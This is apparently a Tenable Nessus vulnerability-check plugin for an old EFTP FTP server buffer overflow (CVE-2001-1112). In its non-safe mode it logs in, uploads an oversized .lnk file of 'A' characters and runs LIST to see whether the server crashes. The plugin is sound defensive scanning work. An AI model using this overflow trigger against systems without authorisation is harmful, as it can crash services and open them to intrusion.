#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10928);
 script_bugtraq_id(3330);
 script_osvdb_id(764);
 script_version("$Revision: 1.27 $");
 script_cve_id("CVE-2001-1112");

 script_name(english:"EFTP .lnk File Handling Remote Overflow");
 script_summary(english:"EFTP buffer overflow");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote FTP server has a buffer overflow vulnerability."
 );
 script_set_attribute(attribute:"description", value:
"The version of EFTP running on the remote host has a remote buffer
overflow vulnerability.  Issuing the LS command on a maliciously
crafted .lnk file results in an overflow.  A remote attacker could
exploit this to crash the service, or possibly execute arbitrary code." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2001/Sep/135"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to EFTP 2.0.8.x or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/03/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/09/12");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");

 script_require_ports("Services/ftp", 21);
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");

 exit(0);
}

#

include("ftp_func.inc");

port = get_ftp_port(default: 21);

user_login = get_kb_item("ftp/login");
user_passwd = get_kb_item("ftp/password");
writeable_dir = get_kb_item("ftp/"+port+"/writeable_dir");
if (! writeable_dir) writeable_dir = get_kb_item("ftp/writeable_dir");
use_banner = 1;

if (user_login && user_passwd && writeable_dir)
{
 use_banner = safe_checks();
}

if (use_banner)
{
 banner = get_ftp_banner(port: port);
 if(egrep(pattern:".*EFTP Version 2\.0\.[0-7]\.", string:banner))
 {
  report = "
*** Nessus detected this solely based on the
*** FTP server's banner. Use caution when
*** testing without safe checks enabled.
";
  security_hole(port:port, extra:report);
 } 
 exit(0);
}

soc = open_sock_tcp(port);
if (!soc) exit(1);

r = ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
if (!r) 
{
 ftp_close(socket: soc);
 exit(1, "Cannot authenticate on port "+port+".");
}

# Go to writeable dir
cmd = strcat('CWD ', writeable_dir, '\r\n');
send(socket:soc, data:cmd);
a = recv_line(socket:soc, length:1024);

f_name = strcat('ness', rand()%10, rand()%10, rand()%10, rand()%10, '.lnk');

# Upload a buggy .LNK
port2 = ftp_pasv(socket:soc);
soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
if ( ! soc2 ) exit(0);
cmd = strcat('STOR ', f_name, '\r\n');
send(socket:soc, data:cmd);
r = recv_line(socket:soc, length:1024);	# Read the 3 digits ?
if(ereg(pattern:"^5[0-9][0-9] .*", string:r)) exit(0);


d = strcat(crap(length:1744, data: 'A'), 'CCCC');
send(socket:soc2, data:d);
close(soc2);

# Now run DIR
cmd = 'LIST\r\n';
send(socket:soc, data:cmd);
r = recv_line(socket: soc, length: 1024);
ftp_close(socket: soc);

# Now check if it is still alive
soc = open_sock_tcp(port);
if (! soc)
{
 report = "
Nessus crashed the FTP server in the course of detecting this
vulnerability.
";
 security_hole(port:port, extra:report);
}

# Or clean mess :)

if (soc)
{ 
 ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
 cmd = strcat('CWD ', writeable_dir, '\r\n');
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 cmd = strcat ('DELE ', f_name, '\r\n');
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 ftp_close(socket: soc);
}
